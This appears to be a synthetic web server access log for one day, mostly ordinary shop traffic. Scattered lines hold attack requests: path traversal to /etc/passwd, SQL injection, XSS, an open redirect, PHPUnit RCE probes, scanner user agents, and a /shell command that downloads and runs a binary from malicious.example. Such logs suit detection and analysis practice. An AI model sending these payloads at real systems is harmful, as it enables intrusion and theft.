10.0.0.23 - - [21/May/2026:14:04:29 +0000] "GET /checkout HTTP/1.1" 200 6808 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.77 - - [21/May/2026:16:54:16 +0000] "GET /index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1" 403 409 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.21 - - [21/May/2026:08:20:15 +0000] "GET /api/v1/status HTTP/1.1" 200 8258 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.24 - - [21/May/2026:17:46:40 +0000] "GET /search?q=phone HTTP/1.1" 200 5579 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.12 - - [21/May/2026:11:56:56 +0000] "GET /contact HTTP/1.1" 200 5341 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.11 - - [21/May/2026:16:40:29 +0000] "GET / HTTP/1.1" 200 3855 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.79 - - [21/May/2026:19:49:02 +0000] "GET /api/v1/user?id=1%27%2bOR%2b%271%27%3d%271 HTTP/1.1" 200 5549 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.12 - - [21/May/2026:09:03:03 +0000] "GET /cart HTTP/1.1" 200 5419 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.11 - - [21/May/2026:14:40:09 +0000] "GET /contact HTTP/1.1" 200 5880 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.21 - - [21/May/2026:17:24:03 +0000] "GET /static/img/logo.png HTTP/1.1" 200 3844 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.11 - - [21/May/2026:12:33:47 +0000] "GET /api/v1/status HTTP/1.1" 200 7668 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:08:25:07 +0000] "GET /static/js/app.js HTTP/1.1" 200 5294 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.10 - - [21/May/2026:09:31:15 +0000] "POST /api/v1/user/profile HTTP/1.1" 404 196 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
172.16.0.44 - - [21/May/2026:16:20:38 +0000] "GET /api/v1/user?id=1%27%2bOR%2b%271%27%3d%271 HTTP/1.1" 404 614 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.11 - - [21/May/2026:08:33:45 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 3772 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.11 - - [21/May/2026:19:11:21 +0000] "GET /api/v1/status HTTP/1.1" 200 8336 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [21/May/2026:14:22:56 +0000] "GET /static/css/style.css HTTP/1.1" 200 1334 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.11 - - [21/May/2026:11:26:00 +0000] "GET /contact HTTP/1.1" 200 7107 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.13 - - [21/May/2026:10:30:09 +0000] "GET /search?q=phone HTTP/1.1" 200 3559 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.11 - - [21/May/2026:10:52:43 +0000] "GET /search?q=laptop HTTP/1.1" 200 1715 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
91.240.118.172 - - [21/May/2026:18:07:00 +0000] "GET /product?id=1/**/UNION/**/SELECT/**/user,password/**/FROM/**/users HTTP/1.1" 500 232 "-" "Nmap Scripting Engine; https://nmap.org/book/nse.html"
203.0.113.12 - - [21/May/2026:12:13:00 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 695 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.22 - - [21/May/2026:19:53:45 +0000] "GET /static/js/app.js HTTP/1.1" 200 7569 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.11 - - [21/May/2026:12:53:26 +0000] "GET /products/43 HTTP/1.1" 200 2732 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.44 - - [21/May/2026:15:25:41 +0000] "GET /product?id=1%20UNION%20SELECT%201%2C2%2C3-- HTTP/1.1" 403 575 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [21/May/2026:17:11:05 +0000] "GET /api/v1/status HTTP/1.1" 200 5356 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.10 - - [21/May/2026:14:25:06 +0000] "GET /static/css/style.css HTTP/1.1" 200 3177 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.11 - - [21/May/2026:18:06:28 +0000] "GET /cart HTTP/1.1" 200 5063 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.11 - - [21/May/2026:13:52:11 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 3113 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.11 - - [21/May/2026:16:15:09 +0000] "GET /products/12 HTTP/1.1" 200 744 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [21/May/2026:19:31:45 +0000] "GET /api/v1/status HTTP/1.1" 200 5924 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.12 - - [21/May/2026:10:36:35 +0000] "GET /checkout HTTP/1.1" 200 1613 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.12 - - [21/May/2026:12:44:24 +0000] "GET /about HTTP/1.1" 200 8179 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.12 - - [21/May/2026:15:40:24 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 3009 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
91.240.118.172 - - [21/May/2026:11:32:32 +0000] "GET /wp-admin/ HTTP/1.1" 403 304 "-" "ffuf/2.1.0"
192.168.1.12 - - [21/May/2026:15:37:45 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 7483 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.12 - - [21/May/2026:11:32:05 +0000] "GET /cart HTTP/1.1" 200 808 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:11:05:58 +0000] "GET /api/v1/status HTTP/1.1" 200 4833 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.10 - - [21/May/2026:18:42:28 +0000] "GET /api/v1/user/profile HTTP/1.1" 200 4124 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.10 - - [21/May/2026:18:35:58 +0000] "GET /static/img/logo.png HTTP/1.1" 200 4300 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.11 - - [21/May/2026:19:25:22 +0000] "GET /static/img/logo.png HTTP/1.1" 200 8147 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.10 - - [21/May/2026:08:09:53 +0000] "GET /contact HTTP/1.1" 200 4795 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
172.16.0.44 - - [21/May/2026:20:13:54 +0000] "POST /api/v1/user?id=1%27%2bOR%2b%271%27%3d%271 HTTP/1.1" 403 49 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.10 - - [21/May/2026:12:35:35 +0000] "GET /search?q=phone HTTP/1.1" 200 5767 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.79 - - [21/May/2026:11:22:51 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 965 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.22 - - [21/May/2026:12:03:18 +0000] "GET /checkout HTTP/1.1" 200 3227 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.79 - - [21/May/2026:18:45:39 +0000] "GET /redirect?url=http%3A%2F%2Fevil.example%2Fphish HTTP/1.1" 403 1130 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.23 - - [21/May/2026:08:59:51 +0000] "GET /static/img/logo.png HTTP/1.1" 200 5278 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.45 - - [21/May/2026:13:58:38 +0000] "POST /api/v1/user?id=1%27%2bOR%2b%271%27%3d%271 HTTP/1.1" 403 360 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.10 - - [21/May/2026:14:31:44 +0000] "GET /static/css/style.css HTTP/1.1" 200 7483 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.11 - - [21/May/2026:08:15:27 +0000] "GET /index.html HTTP/1.1" 200 7871 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.11 - - [21/May/2026:10:50:58 +0000] "GET /api/v1/user/profile HTTP/1.1" 200 3585 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.13 - - [21/May/2026:15:21:51 +0000] "GET /static/css/style.css HTTP/1.1" 200 1572 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.24 - - [21/May/2026:17:50:08 +0000] "GET /search?q=laptop HTTP/1.1" 200 7439 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.12 - - [21/May/2026:15:36:53 +0000] "GET /checkout HTTP/1.1" 200 1870 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
185.220.101.45 - - [21/May/2026:16:02:47 +0000] "GET /admin HTTP/1.1" 404 563 "-" "Nmap Scripting Engine; https://nmap.org/book/nse.html"
203.0.113.10 - - [21/May/2026:12:56:18 +0000] "GET /api/v1/status HTTP/1.1" 200 7689 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.78 - - [21/May/2026:19:17:46 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 403 1099 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.21 - - [21/May/2026:17:15:12 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 2539 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.10 - - [21/May/2026:10:39:03 +0000] "GET /products HTTP/1.1" 200 1804 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.11 - - [21/May/2026:14:55:40 +0000] "GET /index.html HTTP/1.1" 200 5376 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.78 - - [21/May/2026:17:53:36 +0000] "GET /admin/login HTTP/1.1" 403 125 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.12 - - [21/May/2026:18:13:46 +0000] "GET /about HTTP/1.1" 200 2520 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.22 - - [21/May/2026:19:39:40 +0000] "GET /api/v1/status HTTP/1.1" 200 7357 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.79 - - [21/May/2026:13:31:51 +0000] "GET /admin/login HTTP/1.1" 302 800 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.10 - - [21/May/2026:17:24:19 +0000] "GET /checkout HTTP/1.1" 200 7901 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.45 - - [21/May/2026:18:04:50 +0000] "GET /search?q=%22%20OR%20%221%22%3D%221 HTTP/1.1" 500 434 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.13 - - [21/May/2026:08:26:14 +0000] "GET /products HTTP/1.1" 200 7748 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.22 - - [21/May/2026:11:04:31 +0000] "GET /search?q=laptop HTTP/1.1" 200 7069 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.12 - - [21/May/2026:13:38:43 +0000] "GET /static/img/logo.png HTTP/1.1" 200 6622 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.78 - - [21/May/2026:12:54:50 +0000] "POST /wp-login.php HTTP/1.1" 403 380 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.23 - - [21/May/2026:17:45:09 +0000] "GET /products HTTP/1.1" 200 3795 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.12 - - [21/May/2026:09:16:55 +0000] "GET /search?q=laptop HTTP/1.1" 200 2184 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.23 - - [21/May/2026:15:34:11 +0000] "GET /index.html HTTP/1.1" 200 6727 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.21 - - [21/May/2026:08:07:14 +0000] "GET /products HTTP/1.1" 200 3218 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.12 - - [21/May/2026:20:08:10 +0000] "GET /checkout HTTP/1.1" 200 5095 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.11 - - [21/May/2026:16:39:03 +0000] "GET /about HTTP/1.1" 200 2853 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.12 - - [21/May/2026:17:53:20 +0000] "GET /checkout HTTP/1.1" 200 7304 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.12 - - [21/May/2026:09:18:03 +0000] "GET /products/43 HTTP/1.1" 200 3345 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.21 - - [21/May/2026:10:11:53 +0000] "GET /products HTTP/1.1" 200 6901 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.10 - - [21/May/2026:11:30:18 +0000] "GET /search?q=laptop HTTP/1.1" 200 2609 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
172.16.0.44 - - [21/May/2026:14:19:18 +0000] "GET /shell?cd%2B/tmp%3Bwget%2Bhttp%3A//malicious.example/bin%3Bchmod%2B777%2Bbin%3B./bin HTTP/1.1" 404 174 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
185.220.101.45 - - [21/May/2026:15:41:57 +0000] "GET /admin HTTP/1.1" 200 7562 "-" "Skipfish/2.10b"
91.240.118.172 - - [21/May/2026:12:59:33 +0000] "HEAD /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 1168 "-" "Hydra"
10.0.0.23 - - [21/May/2026:18:13:29 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 6738 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
172.16.0.46 - - [21/May/2026:15:57:44 +0000] "GET /comment?text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 404 420 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.23 - - [21/May/2026:08:23:54 +0000] "GET /api/v1/status HTTP/1.1" 200 4019 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.22 - - [21/May/2026:11:12:25 +0000] "GET / HTTP/1.1" 200 5024 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.24 - - [21/May/2026:08:14:15 +0000] "GET /search?q=phone HTTP/1.1" 200 8943 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.11 - - [21/May/2026:17:45:57 +0000] "GET /static/css/style.css HTTP/1.1" 200 6684 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.11 - - [21/May/2026:16:35:42 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 4866 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.24 - - [21/May/2026:10:12:56 +0000] "GET /static/js/app.js HTTP/1.1" 200 1531 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.10 - - [21/May/2026:19:44:16 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 1568 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.23 - - [21/May/2026:11:42:24 +0000] "GET /products/12 HTTP/1.1" 200 2323 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.10 - - [21/May/2026:15:07:00 +0000] "GET /static/js/app.js HTTP/1.1" 200 3820 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.21 - - [21/May/2026:09:02:33 +0000] "GET /static/img/logo.png HTTP/1.1" 200 3805 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
91.240.118.172 - - [21/May/2026:08:44:53 +0000] "GET /comment?text=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 401 947 "-" "Skipfish/2.10b"
10.0.0.22 - - [21/May/2026:12:38:05 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 302 203 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.23 - - [21/May/2026:16:19:07 +0000] "GET /static/css/style.css HTTP/1.1" 200 7695 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.23 - - [21/May/2026:14:05:56 +0000] "GET /search?q=phone HTTP/1.1" 200 1511 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.78 - - [21/May/2026:13:39:42 +0000] "POST /config.php HTTP/1.1" 404 741 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.79 - - [21/May/2026:08:44:59 +0000] "GET /wp-login.php HTTP/1.1" 404 702 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.46 - - [21/May/2026:15:15:27 +0000] "GET /redirect?url=http%3A%2F%2Fevil.example%2Fphish HTTP/1.1" 500 231 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.12 - - [21/May/2026:18:22:53 +0000] "GET /search?q=phone HTTP/1.1" 200 2370 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
172.16.0.45 - - [21/May/2026:19:13:03 +0000] "GET /shell?cd+/tmp;wget+http://malicious.example/bin;chmod+777+bin;./bin HTTP/1.1" 403 117 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.155.205.33 - - [21/May/2026:15:29:01 +0000] "GET /xmlrpc.php HTTP/1.1" 403 777 "-" "Hydra"
10.0.0.23 - - [21/May/2026:20:15:18 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 6652 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.44 - - [21/May/2026:15:31:58 +0000] "POST /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 403 1124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
91.240.118.172 - - [21/May/2026:17:58:14 +0000] "HEAD /xmlrpc.php HTTP/1.1" 200 4227 "-" "Nmap Scripting Engine; https://nmap.org/book/nse.html"
10.0.0.24 - - [21/May/2026:12:40:53 +0000] "GET /about HTTP/1.1" 200 8278 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.22 - - [21/May/2026:15:53:08 +0000] "GET /products/12 HTTP/1.1" 200 6388 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.10 - - [21/May/2026:17:21:35 +0000] "GET /search?q=phone HTTP/1.1" 302 485 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.23 - - [21/May/2026:14:54:55 +0000] "GET /static/js/app.js HTTP/1.1" 200 7283 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.22 - - [21/May/2026:13:17:56 +0000] "GET /contact HTTP/1.1" 200 6689 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
